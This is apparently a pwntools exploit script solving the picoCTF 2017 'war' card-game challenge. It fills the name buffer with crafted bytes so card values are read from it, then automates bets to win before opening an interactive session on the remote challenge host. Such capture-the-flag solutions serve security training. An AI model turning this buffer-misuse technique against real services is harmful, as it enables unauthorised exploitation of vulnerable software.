#!/bin/python2

from pwn import *

host        = 'shell2017.picoctf.com'
port        = '7253'

def info(s):
    log.info(s)

def exploit(p):
    pause()

    payload = '\x03'*32 # player's card values will be read from name buffer
    
    p.sendline(payload)
    p.recvline()

    bet(  1, 52+2) # 52 to run through card buffer, 2 to get back to 50 coins
    bet( 50,    1)
    bet(100,    1)
    bet(200,    1)
    bet(400,    1)

    p.interactive()

def bet(amount, times):
    for i in range(0, times):
        p.sendline(str(amount))
        p.recvline()

if len(sys.argv) <= 1 or sys.argv[1] != "danzig-or-war":
    info("Executing locally")
    p = process(['./war'])
    exploit(p)
else:
    info("Executing on %s:%s" % (host, port))
    p = remote(host, int(port))
    exploit(p)
